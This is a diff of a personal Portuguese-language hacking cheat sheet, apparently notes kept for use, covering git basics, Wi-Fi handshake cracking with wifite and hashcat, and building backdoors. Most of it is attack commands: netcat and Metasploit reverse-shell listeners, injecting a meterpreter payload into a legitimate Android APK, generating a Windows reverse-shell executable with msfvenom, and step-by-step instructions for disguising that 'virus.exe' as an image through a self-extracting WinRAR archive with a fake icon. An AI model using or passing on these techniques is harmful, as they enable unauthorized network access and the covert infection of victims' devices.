@@ -1,9 +1,12 @@
+   ## GITHUB ##
+
 #Salvando arquivos no github
 git status
 git add (documento)
 git commit -m "nome do commit"
 git push -u origin "nome do branch"
 
+   ## WIFI ##
 
 #Usando wifite para hanshake e hashcat para brute force
 sudo cap2hccapx <nombre del archivo>.cap <nombre del archivo>.hccapx (arquivo cap e onde tem as hanshake do wifite)
@@ -13,7 +16,9 @@ https://hashcat.net/cap2hashcat/ (FUNCIONA)
 sudo hashcat -m 2500 -a3 ?d?d?d?d (aquivo).hccapx
 
 
+   ## BACKDOOR ##
 
+#Importante: Para retornar a qualquer porta usada para backdoor, use: sudo nc -nlvp (porta)
 #Backdoor indetectavel windows por codigo executavel no terminal windows
 sudo apt install villain
 
@@ -34,7 +39,7 @@ set LPORT ()
 exploit
 
 
-#Criando PAYLOAD em arquivo original 
+#Criando PAYLOAD em arquivo original para android 
 sudo git clone https://github.com/dana-at-cp/backdoor-apk.git
 
 ./backdoor-apk.sh (ccleaner_v1.17.apk) 
@@ -49,3 +54,29 @@ set PAYLOAD android/meterpreter/reverse_tcp
 show options
 set LHOST ()
 set LPORT ()
+
+#Escondendo backdoor em imagem para windows
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=() LPORT=() -f exe -o ().exe
+
+Forma 1: (Feito no windows)
+www.icoconverter.com (criar imagem de png para ico 32 bits)
+Seleciona no windows ambos arquivos e seleciona WinRAR > Anadir arquivo
+Marcar Crear um arquivo autoexecutavel
+Metodo de compression colocar na opção "A melhor"
+Avançado
+Autoextraivel
+Instalação
+Nome do arquivo para executar (ex: virus.exe)
+Colocar nome da foto.png tambem
+texto e icone
+selecionar icone baixado anteriormente
+aceitar
+Imagem + virus 
+
+Forma 2: (Feito 100% no linux)
+zip ().zip ().txt (escondendo arquivo txt no zip)
+cat ().zip > ().png (escondendo zip na imagem)
+cat ().png (verificar informações da imagem)
+
+
